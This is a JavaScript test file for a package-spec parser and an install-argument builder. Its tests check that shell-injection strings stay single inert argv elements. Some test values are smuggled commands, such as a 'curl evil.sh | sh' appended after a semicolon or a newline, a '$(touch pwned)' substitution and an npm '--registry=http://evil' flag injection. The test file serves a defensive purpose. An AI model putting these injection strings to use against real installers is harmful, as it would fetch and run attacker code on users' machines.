import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { parsePkgSpec, buildInstallSpec } from "./pkg.js";

describe("parsePkgSpec", () => {
  it("parses ecosystem:name@version", () => {
    assert.deepEqual(parsePkgSpec("npm:express@4.18.0"), {
      ecosystem: "npm",
      name: "express",
      version: "4.18.0",
    });
  });

  it("parses a scoped package with a version", () => {
    assert.deepEqual(parsePkgSpec("npm:@socketsecurity/cli@1.0.0"), {
      ecosystem: "npm",
      name: "@socketsecurity/cli",
      version: "1.0.0",
    });
  });

  it("parses a name without a version", () => {
    assert.deepEqual(parsePkgSpec("cargo:ripgrep"), {
      ecosystem: "cargo",
      name: "ripgrep",
      version: undefined,
    });
  });

  it("returns null when there is no ecosystem prefix", () => {
    assert.equal(parsePkgSpec("express"), null);
  });
});

describe("buildInstallSpec — no-shell argv contract", () => {
  it("builds (bin, args[]) for each ecosystem, never a shell string", () => {
    assert.deepEqual(buildInstallSpec({ ecosystem: "npm", name: "express", version: "4.18.0" }), {
      bin: "npm",
      args: ["install", "express@4.18.0"],
    });
    assert.deepEqual(buildInstallSpec({ ecosystem: "pip", name: "requests", version: "2.31.0" }), {
      bin: "pip",
      args: ["install", "requests==2.31.0"],
    });
    assert.deepEqual(buildInstallSpec({ ecosystem: "docker", name: "redis" }), {
      bin: "docker",
      args: ["pull", "redis:latest"],
    });
  });

  it("returns null for an unknown ecosystem", () => {
    assert.equal(buildInstallSpec({ ecosystem: "haxe", name: "whatever" }), null);
  });

  it("keeps shell metacharacters in the name as a SINGLE argv element (injection inert)", () => {
    // A malicious version that would be catastrophic under a shell:
    //   `npm install express@1; curl evil.sh | sh`
    // Under execFile the entire string is one argv element — the package
    // manager simply rejects it; no second command can run.
    const spec = parsePkgSpec("npm:express@1; curl evil.sh | sh");
    assert.ok(spec);
    const install = buildInstallSpec(spec);
    assert.ok(install);
    assert.equal(install.bin, "npm");
    assert.equal(install.args.length, 2, "must not split into extra argv elements");
    assert.equal(install.args[0], "install");
    assert.equal(install.args[1], "express@1; curl evil.sh | sh");
  });

  it("treats backtick / command-substitution names as one inert argv element", () => {
    const install = buildInstallSpec({ ecosystem: "cargo", name: "$(touch pwned)`id`" });
    assert.ok(install);
    assert.deepEqual(install.args, ["install", "$(touch pwned)`id`"]);
  });
});

describe("buildInstallSpec — ecosystem table, version handling and lookup boundaries", () => {
  it("uses each package manager's own version syntax and subcommand", () => {
    // The version separator is ecosystem-specific: swapping any of these
    // silently changes WHICH artifact gets installed, so each is pinned.
    assert.deepEqual(buildInstallSpec({ ecosystem: "pnpm", name: "zod", version: "3.23.8" }), {
      bin: "pnpm",
      args: ["add", "zod@3.23.8"],
    });
    assert.deepEqual(buildInstallSpec({ ecosystem: "pip", name: "requests", version: "2.31.0" }), {
      bin: "pip",
      // pip pins with `==`; `requests@2.31.0` would be read as a direct URL/VCS ref
      args: ["install", "requests==2.31.0"],
    });
    assert.deepEqual(
      buildInstallSpec({ ecosystem: "docker", name: "library/redis", version: "7.2" }),
      { bin: "docker", args: ["pull", "library/redis:7.2"] },
    );
  });

  it("puts -g before the package name for npm-g", () => {
    const install = buildInstallSpec({
      ecosystem: "npm-g",
      name: "sandstream-kit",
      version: "1.2.3",
    });
    assert.ok(install);
    // Ordering is part of the contract: the flag must not land after the
    // package name where a future arg-forwarding change could shadow it.
    assert.deepEqual(install.args, ["install", "-g", "sandstream-kit@1.2.3"]);
  });

  it("silently drops the version for brew, go and cargo", () => {
    // Documenting ACTUAL behaviour: these three builders ignore their second
    // argument, so a pinned request installs whatever is latest. See notes.
    assert.deepEqual(buildInstallSpec({ ecosystem: "brew", name: "trivy", version: "0.50.0" }), {
      bin: "brew",
      args: ["install", "trivy"],
    });
    assert.deepEqual(buildInstallSpec({ ecosystem: "cargo", name: "ripgrep", version: "14.0.0" }), {
      bin: "cargo",
      args: ["install", "ripgrep"],
    });
    assert.deepEqual(
      buildInstallSpec({
        ecosystem: "go",
        name: "github.com/sigstore/cosign/v2",
        version: "2.4.0",
      }),
      { bin: "go", args: ["install", "github.com/sigstore/cosign/v2"] },
    );
  });

  it("treats an empty version string as no version at all", () => {
    // `version` is tested for truthiness, so "" must not produce `pkg@` /
    // `pkg==` — a trailing separator would be rejected by the package manager.
    assert.deepEqual(buildInstallSpec({ ecosystem: "npm", name: "express", version: "" }), {
      bin: "npm",
      args: ["install", "express"],
    });
    assert.deepEqual(buildInstallSpec({ ecosystem: "pip", name: "requests", version: "" }), {
      bin: "pip",
      args: ["install", "requests"],
    });
    // docker still gets an explicit tag rather than a bare name
    assert.deepEqual(buildInstallSpec({ ecosystem: "docker", name: "redis", version: "" }), {
      bin: "docker",
      args: ["pull", "redis:latest"],
    });
  });

  it("matches ecosystem names case-sensitively and rejects an empty ecosystem", () => {
    // Fail closed: anything not exactly in the table returns null so the
    // caller reports "Unknown ecosystem" instead of guessing a package manager.
    assert.equal(buildInstallSpec({ ecosystem: "NPM", name: "express" }), null);
    assert.equal(buildInstallSpec({ ecosystem: "Docker", name: "redis" }), null);
    assert.equal(buildInstallSpec({ ecosystem: "npm ", name: "express" }), null);
    assert.equal(buildInstallSpec({ ecosystem: "", name: "express" }), null);
  });

  it("throws on Object.prototype key names instead of returning null", () => {
    // ACTUAL behaviour, not desired: the lookup is a plain `map[key]`, so
    // inherited members are found, pass the truthiness guard, and then blow up
    // on `.install`. `kit pkg constructor:x` is a crash, not a clean rejection.
    for (const ecosystem of ["constructor", "__proto__", "hasOwnProperty", "toString"]) {
      assert.throws(() => buildInstallSpec({ ecosystem, name: "x" }), TypeError);
    }
  });

  it("returns a fresh args array on every call", () => {
    // Callers (and tests) mutate/inspect args; a shared array would leak flags
    // from one install into the next.
    const first = buildInstallSpec({ ecosystem: "npm", name: "express" });
    assert.ok(first);
    first.args.push("--force");
    const second = buildInstallSpec({ ecosystem: "npm", name: "express" });
    assert.ok(second);
    assert.deepEqual(second.args, ["install", "express"]);
  });

  it("passes a flag-shaped name through as a single argv element without validating it", () => {
    // ACTUAL behaviour: nothing rejects a leading `--`, so a name like
    // `--registry=…` reaches npm as an option. Recorded so that if a guard is
    // added later this test is the one that has to change deliberately.
    assert.deepEqual(buildInstallSpec({ ecosystem: "npm", name: "--registry=http://evil" }), {
      bin: "npm",
      args: ["install", "--registry=http://evil"],
    });
  });

  it("keeps a newline inside the name in one argv element", () => {
    const install = buildInstallSpec({ ecosystem: "pip", name: "requests\ncurl evil.sh | sh" });
    assert.ok(install);
    // A newline is the classic way to smuggle a second command through
    // anything that later joins argv into a shell line.
    assert.equal(install.args.length, 2);
    assert.equal(install.args[1], "requests\ncurl evil.sh | sh");
  });

  it("builds a spec for an empty package name rather than rejecting it", () => {
    // ACTUAL behaviour: an empty name yields an empty argv element; the guard
    // against `kit pkg npm:` lives (if anywhere) in the caller, not here.
    assert.deepEqual(buildInstallSpec({ ecosystem: "npm", name: "" }), {
      bin: "npm",
      args: ["install", ""],
    });
  });
});
